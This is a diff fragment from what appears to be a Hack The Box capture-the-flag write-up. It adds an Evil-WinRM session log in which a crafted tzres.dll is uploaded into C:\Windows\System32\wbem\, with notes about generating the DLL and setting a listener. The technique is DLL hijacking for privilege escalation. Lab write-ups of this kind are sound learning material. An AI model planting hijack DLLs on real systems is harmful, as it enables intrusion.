@@ -828,5 +828,18 @@ First ill generate the DLL with the right name
 
 Then ill set a listener
 
+```python
+*Evil-WinRM* PS C:\Windows\System32\wbem> upload tzres.dll .
+                                        
+Info: Uploading /home/kali/htb/certificate/tzres.dll to C:\Windows\System32\wbem\.
+                                        
+Data: 12288 bytes of 12288 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Windows\System32\wbem> 
+```
+
+Then ill just upload the DLL to the right path in `C:\Windows\System32\wbem\`
+
 
 
